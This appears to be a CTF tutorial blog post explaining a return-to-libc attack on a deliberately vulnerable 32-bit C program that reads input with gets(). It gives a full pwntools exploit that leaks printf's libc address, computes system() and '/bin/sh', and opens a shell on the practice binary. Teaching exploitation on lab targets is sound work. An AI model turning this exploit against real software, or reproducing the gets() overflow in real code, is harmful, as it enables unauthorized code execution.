---
layout: post
title:  "Return to libc attack"
date:   2020-01-26 #13:52:01
categories: ctf
description: this article explains about return to libc attack.
tags: pwn ret2libc stack
---

if we can control instruction pointer , it possible to us to doing this attack.
this method can be used even the target machine have aslr and pie enabled, since we can
leak libc function and calculate it with some offset. we can use this code :

{% highlight c %}
#include <stdio.h>

int main()
{
    char buf[200]; // limitation
    printf("+-------------------------------------------+\n");
    printf("|            developed by tripoloski   2019 |\n");
    printf("|  how to :                                 |\n");
    printf("|           - leaking libc                  |\n");
    printf("|           - calculate to got shell        |\n");
    printf("+-------------------------------------------+\n");
    printf("buff > ");
    gets(&buf); // bug in here
    return 0;
}
{% endhighlight %}

you can get the binary from my repository [here](https://github.com/tripoloski1337/learn-to-pwn/tree/master/defeat_aslr)

i assume you already know about buffer overflow vulnerability. firstly we need to
find the offset to overwrite instruction pointer , i use gdb-gef to do dynamic analysis
you can find gdb-gef [here](https://github.com/hugsy/gef). to find the offset i use pattern
to automatic calculate the offset

<img src="/images/ret2libc/2020-01-26-141108_901x750_scrot.png" />

the offset to overwrite eip is 208 bytes , so we need 208 bytes padding to be able to overwrite eip.
now let's find puts@plt by using objdump

<img src="/images/ret2libc/2020-01-26-141615_423x133_scrot.png"/>

and now let's find libc function by using readelf

<img src="/images/ret2libc/2020-01-26-141731_455x194_scrot.png" />

we will use printf , so now we will leak printf address. our exploit should be look
like this
{% highlight python %}
  p = "A" * 208
  p += p32(puts) # puts plt from objdump
  p += p32(main)  # you can find main like puts using objdump
  p += p32(printf) # printf from readelf
{% endhighlight %}

the binary will jump back to main function after leak printf , its like
{% highlight c %}
puts(&printf)
main()
{% endhighlight %}

now we can grab that leaked address and calculate it to system offset , and send another exploit that contains
system() and string "/bin/sh" , our full exploit will look like this

{% highlight python %}
from pwn import *
r = process("./lib")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
def main():
	puts = 0x08049050
	printf = 0x0804c00c
	main = 0x08049182
	p = "A" * 208
	p += p32(puts)
	p += p32(main)
	p += p32(printf)
	r.sendline(p)
	r.recvuntil("buff > ")
	printf_leak = u32(r.recv(4))
	log.info("leaked printf glibc : %s " % hex(printf_leak) )

	libc_base = printf_leak - libc.symbols['printf']
	libc_system = libc_base + libc.symbols['system']
	binsh_str = libc_base + libc.search("/bin/sh").next()

	q = "A" * 208
	q += p32(libc_system)
	q += p32(00)
	q += p32(binsh_str)

	r.sendline(q)
	r.interactive()

	r.interactive()

if __name__ == '__main__':
	main()

{% endhighlight %}
